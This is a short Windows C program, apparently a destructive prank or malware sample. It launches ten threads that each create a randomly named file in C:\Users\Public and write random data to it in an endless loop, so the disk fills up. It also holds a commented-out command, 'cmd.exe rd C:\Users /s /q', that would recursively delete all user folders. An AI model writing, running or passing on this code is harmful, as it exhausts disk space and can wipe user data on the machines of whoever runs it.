#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<time.h>

#define MAX_THREAD 10

void rubbish()
{
    //Get Thread ID
    DWORD tid = GetCurrentThreadId();
    //srand
    srand(tid + time(NULL));
    //Create a file with random name
    char name[512];
    char *path = "C:\\Users\\Public\\";
    sprintf(name, "%s%d", path, rand());
    FILE *fp = fopen(name, "wb");
    if(fp)
    {
        while(1){
            //Write random data to the file
            char data[1024];
            for(int i = 0; i < 1024; i++)
                data[i] = rand();
            fwrite(data, 1, 1024, fp);
        }
    }
}

int main()
{
    //Use CreateProcess to Lauch CMD.exe
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    //CreateProcess(NULL, "cmd.exe rd C:\\Users /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    for(int i = 0; i < MAX_THREAD; i++)
    {
        //Create a thread to write rubbish data to the disk
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rubbish, NULL, 0, NULL);
    }
    while(1)
    {
        Sleep(1000);
    }
}
